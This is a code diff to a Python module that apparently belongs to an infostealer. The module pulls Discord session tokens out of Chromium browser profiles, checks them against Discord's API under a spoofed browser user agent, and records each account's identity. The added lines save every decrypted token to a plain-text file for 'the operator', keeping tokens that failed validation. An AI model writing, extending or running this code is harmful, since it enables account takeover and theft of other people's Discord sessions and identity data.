@@ -23,6 +23,13 @@ Validation is rate-limited on purpose. Fifty hits from one profile would otherwi
 fifty requests, and a dead token answered 401 fifty times teaches nothing after the
 first. Results — valid, invalid, and the identity payload — are cached by token for
 the life of the process, and the run spends at most ``_MAX_VALIDATIONS`` requests.
+
+Two files come out of this: ``sessions.json``, which is the record and carries the
+verdict and the identity beside every token, and ``discord_session.txt``, which is the
+bare strings, one per line. The text file holds everything that decrypted, including a
+token Discord answered 401 for — a refused validation is a fact about the account, not
+about the extraction, and a file that silently drops it cannot tell the operator which
+of the two happened. Verdicts live in the record.
 """
 
 from __future__ import annotations
@@ -41,7 +48,11 @@ from typing import Any, Final
 from .. import log, util
 from .browsers import chromium, chromium_roots, profile_dirs
 
+SESSION_FILE: Final[str] = "discord_session.txt"
+RECORD_FILE: Final[str] = "sessions.json"
+
 _ME_URL: Final[str] = "https://discord.com/api/v9/users/@me"
+
 _USER_AGENT: Final[str] = (
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
     "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
@@ -271,9 +282,17 @@ def run(out_dir: Path, cfg: Any) -> int:
         return 0
 
     entries = list(seen.values())
-    if not util.write_json(out_dir / "sessions.json", entries):
+
+    # The bare strings first: a refused write here still leaves the record, and a token
+    # written is the whole point of the module. Validity is not filtered on — see the
+    # module docstring.
+    keep = [entry["token"] for entry in entries]
+    if keep and not util.write_text(out_dir / SESSION_FILE, "\n".join(keep) + "\n"):
+        log.logger.warning("sessions: could not write %s", SESSION_FILE)
+
+    if not util.write_json(out_dir / RECORD_FILE, entries):
         return 0
     return len(entries)
 
 
-__all__ = ["run"]
+__all__ = ["RECORD_FILE", "SESSION_FILE", "run"]
